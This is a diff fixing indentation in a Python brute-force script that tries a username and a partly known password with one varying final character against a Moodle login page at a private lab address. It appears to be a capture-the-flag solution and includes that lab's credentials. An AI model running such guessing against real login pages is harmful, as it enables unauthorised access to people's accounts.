@@ -80,23 +80,23 @@ class Teacher:
     def __init__(self, target="http://10.10.10.153/", path="moodle/login/index.php",
                                            end_pass=None):
 
-    '''
-        This function will create
-        the variables by defaults and testing.
-    '''
+        '''
+            This function will create
+            the variables by defaults and testing.
+        '''
 
-    self.target_url   = target
-    self.path_url     = path
-    self.end_password = end_pass
+        self.target_url   = target
+        self.path_url     = path
+        self.end_password = end_pass
 
     def send_req(self):
-    '''
-        This feature will handle the attack
-        and send the passwords and test them in function send_req()
-    '''
-    self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]
+        '''
+            This feature will handle the attack
+            and send the passwords and test them in function send_req()
+        '''
+        self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]
 
-    for convert_password in self.end_password:
+        for convert_password in self.end_password:
         plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
         plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}
 
